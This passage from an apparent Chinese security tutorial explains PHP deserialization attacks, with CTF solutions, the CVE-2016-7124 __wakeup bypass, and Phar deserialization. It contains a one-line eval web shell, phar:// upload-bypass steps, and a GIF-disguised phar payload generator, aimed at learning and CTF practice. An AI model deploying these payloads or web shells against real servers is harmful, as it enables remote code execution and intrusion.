<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 触发 __get()</span>
<span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">;</span>
<span class="token comment">// 触发 __set()</span>
<span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span>
<span class="token comment">// 触发 __unset()</span>
<span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 触发 __call()</span>
<span class="token variable">$obj</span><span class="token operator">-></span><span class="token function">hidden</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="特殊属性的反序列化"><a href="#特殊属性的反序列化" class="headerlink" title="特殊属性的反序列化"></a>特殊属性的反序列化</h3><p><strong>PHP类中的特殊属性</strong></p>
<p>序列化为了能把整个类对象的各种信息完完整整的压缩，格式化，也会将属性的权限序列化进去。但不</p>
<p>同类型的属性会有不同的格式。</p>
<ol>
<li>Public 权限</li>
</ol>
<p>可以内部调用，实例调用等</p>
<ol start="2">
<li>Private权限</li>
</ol>
<p>被private修饰的只能是同一个类的可以访问</p>
<ol start="3">
<li>Protected权限</li>
</ol>
<p>对继承的类开放，没继承的类不开放</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">myClass</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'tivon'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'20'</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"man"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">myClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ser.dat'</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>

结果：
O:7:"myClass":3:
&#123;s:4:"name";s:5:"tivon";s:12:"myClassage";s:2:"20";s:6:"*sex";s:3:"man";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/179.PNG" alt="179"></p>
<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">Public 属性无需修改
Private格式：%00类名%00属性名
Protected格式：%00*%00属性名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>在url中传递参数可以使用 %00 代替空字符</strong></p>
<h4 id="反序列化利用"><a href="#反序列化利用" class="headerlink" title="反序列化利用"></a>反序列化利用</h4><h5 id="牛刀小试"><a href="#牛刀小试" class="headerlink" title="牛刀小试"></a>牛刀小试</h5><p>序列化已经存在的类，修改其属性值</p>
<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
class Test&#123;
    public $name&#x3D;&quot;tom&quot;;
    public $age&#x3D;&quot;16&quot;;
    public function get_age()&#123;
    echo $this-&gt;age;
    &#125;
&#125;
$boy &#x3D; new Test();
#$boy-&gt;get_age();
&#x2F;&#x2F;进行序列化
echo serialize($boy);
&#x2F;&#x2F;进行反序列化
$str &#x3D; $_GET[&#39;str&#39;];
$newboy &#x3D; unserialize($str);
$newboy-&gt;get_age();
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>传入一个 Test 类的实例对象，该对象的 name 值为 “admin” 即可</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag_&#123;xxxxxxxxxxxxxxxxxx&#125;'</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$u</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'less2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h5 id="wakeup绕过CVE-2016-7124"><a href="#wakeup绕过CVE-2016-7124" class="headerlink" title="__wakeup绕过CVE-2016-7124"></a>__wakeup绕过CVE-2016-7124</h5><p>影响版本为 php5 ~ 5.6.25、php7 ~ 7.0.10</p>
<p>当序列化字符串中属性个数不正确时，__wakeup方法不会被调用</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
修改后
<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>攻防世界：</strong><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a> <strong>题目名称：</strong> unserialize3</p>
<p><img src="/2023/012220963/208.PNG" alt=" "></p>
<h5 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="正则匹配绕过"></a>正则匹配绕过</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以在类名长度前加上+号，绕过正则，同样在属性个数、属性名长度的数字前都可以加上 + 号绕过正</p>
<p>则匹配</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
等同于
<span class="token constant">O</span><span class="token punctuation">:</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>攻防世界：</strong><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a> <strong>题目名称：</strong> Web_php_unserialize</p>
<p><strong>题解：</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fl4g.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"O:"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"O:+"</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1:&#123;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"2:&#123;"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$d</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h3><h4 id="Phar反序列化概要"><a href="#Phar反序列化概要" class="headerlink" title="Phar反序列化概要"></a>Phar反序列化概要</h4><p>除了unserialize()来利用反序列化漏洞之外，还可以利用phar文件以序列化的形式存储用户自定义的</p>
<p>meta-data这一特性，扩大php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()</p>
<p>等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</p>
<p>来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数</p>
<p>unserialize()的前提下，引起严重的php对象注入漏洞。</p>
<p>这个新的攻击方式被他公开在BlackHat会议演讲上。主题为：“不为人知的php反序列化漏洞”。它可以</p>
<p>使攻击者将相关漏洞的验证级别升级为远程代码执行。</p>
<h4 id="什么是Phar文件"><a href="#什么是Phar文件" class="headerlink" title="什么是Phar文件"></a>什么是Phar文件</h4><p>在软件中，Phar（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像、</p>
<p>样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。</p>
<p>Php通过用户定义和内置“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，比如：</p>
<p>fopen()、copy()、file_exists()、filesize()。Phar://就是一种内置的流包装器</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PHP</span>中常见的流包装器如下：
file<span class="token punctuation">:</span><span class="token comment">// 访问本地文件系统，在用文件系统函数时默认使用该包装器</span>
http<span class="token punctuation">:</span><span class="token comment">// 访问HTTP(s)网址</span>
ftp<span class="token punctuation">:</span><span class="token comment">// 访问FTP(s) urls</span>
php<span class="token punctuation">:</span><span class="token comment">// 访问各个输入/输出流（I/O Streams）</span>
zlib<span class="token punctuation">:</span><span class="token comment">// 压缩流</span>
data<span class="token punctuation">:</span><span class="token comment">// 数据（RFC 2397）</span>
glob<span class="token punctuation">:</span><span class="token comment">// 查找匹配的文件路径模式</span>
phar<span class="token punctuation">:</span><span class="token comment">// php归档</span>
ssh2<span class="token punctuation">:</span><span class="token comment">// Secure shell 2</span>
rar<span class="token punctuation">:</span><span class="token comment">// RAR</span>
ogg<span class="token punctuation">:</span><span class="token comment">// 音频流</span>
expect<span class="token punctuation">:</span><span class="token comment">// 处理交互式的流</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="phar与文件包含"><a href="#phar与文件包含" class="headerlink" title="phar与文件包含"></a>phar与文件包含</h4><p>使用 Phar:// 伪协议流可以Bypass一些上传的waf，大多数情况下和文件包含一起使用，就类似于我们</p>
<p>的压缩包（其实就是一个压缩包），只不过换了一种方式执行。</p>
<ol>
<li>准备一个木马文件 shell.php</li>
</ol>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>​    准备一个简单的文件包含漏洞模型 include.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>将shell.php文件压缩为 shell.zip 并改后缀为 shell.jpg</li>
<li>找到存在文件包含的漏洞点，使用phar://协议进行文件包含，格式如下：</li>
</ol>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">用法：<span class="token operator">?</span>file<span class="token operator">=</span>phar<span class="token punctuation">:</span><span class="token comment">//压缩包/内部文件</span>
phar<span class="token punctuation">:</span><span class="token comment">//./shell.jpg/shell.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/209.PNG" alt=" "></p>
<h4 id="zip-协议与文件包含"><a href="#zip-协议与文件包含" class="headerlink" title="zip://协议与文件包含"></a>zip://协议与文件包含</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">使用zip协议，需要指定绝对路径，同时将<span class="token comment">#编码为%23，之后填上压缩包内的文件</span>
zip<span class="token punctuation">:</span><span class="token comment">//D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</span>
压缩包内存在子文件夹
zip<span class="token punctuation">:</span><span class="token comment">//D:\phpStudy\WWW\fileinclude\test.zip%23test\phpinfo.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/210.PNG" alt=" "></p>
<h4 id="Phar文件的结构"><a href="#Phar文件的结构" class="headerlink" title="Phar文件的结构"></a>Phar文件的结构</h4><p> phar文件都包含以下几个部分</p>
<ol>
<li><strong>stub</strong></li>
</ol>
<p>phar文件的标志，必须以xxx_HALT_COMPLER();?&gt;结尾，否则无法识别。Xxx可以为自定义内容</p>
<ol start="2">
<li><strong>manifest</strong></li>
</ol>
<p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分</p>
<p>还会以序列化的形式存储用户自定义的meta-data，Meta-data部分的信息会以序列化的形式储</p>
<p>存，这里就是漏洞利用的关键点。</p>
<p><img src="/2023/012220963/211.PNG" alt=" "></p>
<ol start="3">
<li><strong>content</strong></li>
</ol>
<p>被压缩文件的内容, 在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利</p>
<p>用这个漏洞主要是为了触发它的反序列化 。</p>
<ol start="4">
<li><strong>signature(可空)</strong></li>
</ol>
<p>签名，放在末尾</p>
<h4 id="生成一个Phar文件"><a href="#生成一个Phar文件" class="headerlink" title="生成一个Phar文件"></a>生成一个Phar文件</h4><h5 id="php-ini配置"><a href="#php-ini配置" class="headerlink" title="php.ini配置"></a>php.ini配置</h5><p>要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</p>
<p>将下列代码粘贴在php文件中，运行该php文件即可得到 phar 文件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后缀名必须为phar</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置stub</span>
<span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$o</span> <span class="token operator">-></span> <span class="token property">name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'hack'</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将自定义的meta-data存入manifest</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加要压缩的文件</span>
<span class="token comment">//签名自动计算</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="一个简单的小例子"><a href="#一个简单的小例子" class="headerlink" title="一个简单的小例子"></a>一个简单的小例子</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar_demo.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>测试结果：</strong></p>
<p><img src="/2023/012220963/212.PNG" alt=" "></p>
<p><img src="/2023/012220963/213.PNG" alt=" "></p>
<p><strong>生成的phar文件要上传到对方服务器，才可以使用。</strong></p>
<h4 id="Phar反序列化漏洞的利用条件"><a href="#Phar反序列化漏洞的利用条件" class="headerlink" title="Phar反序列化漏洞的利用条件"></a>Phar反序列化漏洞的利用条件</h4><ol>
<li><p>Phar文件要能够上传到服务器端</p>
</li>
<li><p>要有可用的魔术方法作为“跳板”</p>
</li>
<li><p>文件操作函数的参数可控，且冒号、/、phar等特殊字符没有被过滤</p>
</li>
<li><p>受影响的文件操作函数有：</p>
</li>
</ol>
<p><img src="/2023/012220963/214.PNG" alt=" "></p>
<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">在跟踪了受影响函数的调用情况后发现，除了所有文件函数，只要是函数的实现过程直接或间接调用了
php_stream_open_wrapper。都可能触发phar反序列化。

exif
	exif_thumbnail
	exif_imagetype
gd
	imageloadfont
	imagecreatefrom***
Hash
	hash_hmac_file
	hash_file
	hash_update_file
	md5_file
	sha1_file
file&#x2F;url
	get_meta_tags
	get_headers
Standard
	getimagesize
	getimagesizefromstring
Zip
	$zip &#x3D; new ZipArchive();
	$res &#x3D; $zip-&gt;open(&#39;c.zip’);
	$zip-&gt;extractTo(&#39;phar:&#x2F;&#x2F;test.phar&#x2F;test’);
Bzip&#x2F;Gzip
	$z &#x3D; &#39;compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;home&#x2F;catsay&#x2F;test.phar&#x2F;test.txt’;
	$z &#x3D; &#39;compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;home&#x2F;catsay&#x2F;test.phar&#x2F;test.txt&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="Phar-CTF练习"><a href="#Phar-CTF练习" class="headerlink" title="Phar-CTF练习"></a>Phar-CTF练习</h4><h5 id="绕过文件格式限制的例子"><a href="#绕过文件格式限制的例子" class="headerlink" title="绕过文件格式限制的例子"></a>绕过文件格式限制的例子</h5><h6 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h6><p>首先是根据index.php写一个生成phar的php文件，当然需要绕过gif图片文件头判断，所以需要加</p>
<p>GIF89a，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用</p>
<p>file_exists，使用 phar:// 执行代码</p>
<h6 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h6><p>eval.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">AnyClass</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo "ok";'</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GIF89a'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//GIF89a进行图片欺诈</span>
<span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$object</span> <span class="token operator">-></span> <span class="token property">output</span><span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">;</span>
<span class="token comment">// $object -> output= 'eval(@$_REQUEST[1]);';</span>
<span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



